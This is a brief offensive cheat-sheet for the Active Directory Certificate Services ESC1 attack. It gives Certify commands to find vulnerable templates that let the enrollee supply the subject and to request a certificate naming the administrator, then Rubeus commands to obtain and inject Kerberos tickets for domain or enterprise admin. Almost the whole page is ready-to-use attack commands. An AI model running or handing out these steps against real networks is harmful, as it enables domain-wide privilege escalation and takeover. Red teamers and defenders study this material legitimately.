# ESC1

{% hint style="info" %}
Enrolee can request cert for ANY user
{% endhint %}

### [Certify](https://github.com/GhostPack/Certify)

* _**Find template that has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag.**_&#x20;
  * `Certify.exe find /enrolleeSuppliesSubject`&#x20;
* _**Target template allows enrollment to the target group where the compromised user is a member**_
  *    `Certify.exe request /ca:<CA-Domain>\<CA-Username> /template:<target-template-name> /altname:administrator`
* _**Convert from cert.pem to pfx and use it to request a TGT for DA (or EA).**_
  * `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt` <sub>(DA)</sub>
  * `Rubeus.exe asktgt /user:<parent-domain>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /password:SecretPass@123 /ptt`  <sub>(EA)</sub>
